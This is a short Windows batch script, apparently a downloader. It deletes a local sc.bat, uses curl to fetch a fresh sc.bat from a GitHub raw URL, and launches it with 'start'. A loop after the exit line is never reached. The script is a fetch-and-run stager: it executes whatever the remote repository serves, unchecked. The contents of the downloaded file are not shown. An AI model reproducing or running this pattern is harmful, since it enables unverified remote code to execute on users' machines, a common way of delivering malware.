@echo off
:a
del sc.bat
curl https://raw.githubusercontent.com/SeduHome/Test/main/sc.bat > sc.bat
start sc.bat
exit
timeout /t 3 /nobreak >nul
goto a